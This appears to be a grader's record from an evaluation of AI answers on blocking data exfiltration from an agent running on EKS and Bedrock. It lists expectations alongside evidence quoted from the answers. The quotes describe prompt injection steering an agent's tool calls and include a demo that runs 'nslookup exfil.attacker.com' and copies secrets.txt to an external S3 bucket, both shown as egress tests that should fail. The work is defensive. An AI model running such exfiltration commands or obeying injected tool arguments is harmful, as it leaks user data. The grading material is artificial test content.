expectations.text: States that the MODEL ENDPOINT must move inside the tenant (e.g. Azure AI Foundry / Azure OpenAI) — Bedrock cannot serve the data-bearing calls

expectations.text: Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel
expectations.evidence: Opens with exactly this frame: 'In an agentic system, **every reachable network destination is an exfiltration channel available to a hijacked agent** — and a tool call is an egress channel. Prompt injection can at worst misuse an approved channel; it cannot open a new one.' Grounded in MITRE ATLAS and OWASP LLM02.

expectations.text: Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)
expectations.evidence: FAIL. Bedrock model invocation logging is named once, as an evidence artifact to hand over — 'plus Bedrock **model invocation logging** delivering prompts/completions to an S3 bucket with Object Lock (WORM) if you need tamper-evident retention' — but the answer nowhere states that it is OFF BY DEFAULT or that it must be explicitly enabled. It is presented as something you already have. CloudTrail is referenced only for management events ('`bedrock:InvokeModel` events with the pod's assumed-role identity'); CloudTrail DATA events are never mentioned. EKS control-plane audit logs (also off by default) are relied on implicitly ('a rejected-pod event in the audit log') without noting they must be turned on. The core discriminating content of this assertion — awareness that the agent-runtime audit trail does not exist until you enable it — is absent. Compare the with_skill run, which ships a Default column showing these surfaces as 'off'.

expectations.text: Offers a concrete demonstrable proof for the reviewer (e.g. exec into a pod and show an outbound curl / external DNS resolution being blocked)
expectations.evidence: 'The demo that actually ends the meeting' — a runnable five-command block: 'kubectl exec -it deploy/agent -n agents -- sh; curl -m 5 https://example.com # hangs, then times out; nslookup exfil.attacker.com # SERVFAIL / no route; aws bedrock-runtime invoke-model --model-id <a model not on the allowlist> # AccessDeniedException; aws s3 cp secrets.txt s3://some-external-bucket # AccessDenied'. Strongest single artifact in the baseline answer, and it is graded as fully passing.

expectations.text: Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel
expectations.evidence: The answer is structured as an enumeration of ten exfil paths ('The egress paths, and what closes each one'), reframes the question structurally ('Nothing about the model's behavior is load-bearing ... If the agent decides to exfiltrate, the packet has nowhere to go'), and row 8 covers the tool-call channel directly: 'Prompt injection makes the agent call a *legitimate* tool with attacker-chosen args — `send_email(to=…)`, `http_get(url=…)` ... No tool takes a free-form destination.' It also closes with 'If your agent currently has a general-purpose HTTP tool, a shell tool, or an unscoped S3 write, fix that before the review.'
